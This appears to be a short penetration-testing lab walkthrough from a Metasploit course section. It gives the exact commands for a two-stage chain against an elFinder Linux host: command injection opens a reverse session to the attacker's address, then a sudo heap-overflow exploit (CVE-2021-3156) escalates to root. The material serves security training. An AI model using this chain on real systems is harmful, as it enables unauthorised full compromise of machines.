# Module 39 — Using The Metasploit Framework
## Section 10: Sessions & Jobs

**Target:** Linux box running elFinder.

## Approach — two-stage exploit chain

**Stage 1 — foothold (www-data):**
```
use exploit/linux/http/elfinder_archive_cmd_injection
set RHOSTS <target>
set LHOST <your-tun0-ip>
exploit
```

**Stage 2 — privesc to root:**
```
use exploit/linux/local/sudo_baron_samedit   # CVE-2021-3156, sudo heap overflow
set SESSION <session-id-from-stage-1>
exploit
```
Chaining these two Metasploit modules takes you from unauthenticated to root.
